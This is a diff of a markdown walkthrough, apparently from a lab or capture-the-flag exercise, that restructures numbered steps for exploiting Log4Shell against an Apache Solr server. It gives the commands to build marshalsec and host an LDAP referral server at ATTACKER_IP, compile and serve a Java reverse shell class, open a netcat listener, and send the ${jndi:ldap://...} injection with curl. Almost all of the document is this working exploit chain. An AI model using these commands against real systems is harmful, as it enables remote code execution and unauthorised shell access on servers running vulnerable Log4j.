@@ -10,35 +10,37 @@
 
 ## Steps: 
 
-#### 1) 
+#### 1) Download marshalsec LDAP referral server
+
+    git clone https://github.com/mbechler/marshalsec
 
     cd /marshalsec
 
-#### 2) 
+#### 2) Install marshalsec utility
 
-    mvn clean package -DskipTests (Install marshalsec utility)
+    mvn clean package -DskipTests 
 
-#### 3) 
+#### 3) Host LDAP server with marshalsec
 
-    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit" (Host LDAP server with marshalsec)
+    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit" 
 
 #### 4) Create a java reverse shell exploit (Exploit.java)
 
-#### 5) 
+#### 5) Compile the java exploit into a class file (Exploit.class)
 
-    javac Exploit.java -target 8 -source 8 (Compile the java exploit into a class file (Exploit.class))
+    javac Exploit.java -target 8 -source 8 
 
-#### 6) 
+#### 6) Host compiled payload to HTTP server
 
-    python3 -m http.server 8000 (Host compiled payload to HTTP server)
+    python3 -m http.server 8000 
 
-#### 7)  
+#### 7)  Setup listener
 
-    nc -lvnp PORT (Setup listener)
+    nc -lvnp PORT 
 
-#### 8) 
+#### 8) Send payload to target machine to get a reverse shell
 
-    curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}' (Send payload to target machine to get a reverse shell)
+    curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}' 
 
 ## JNDI syntax injection:
 
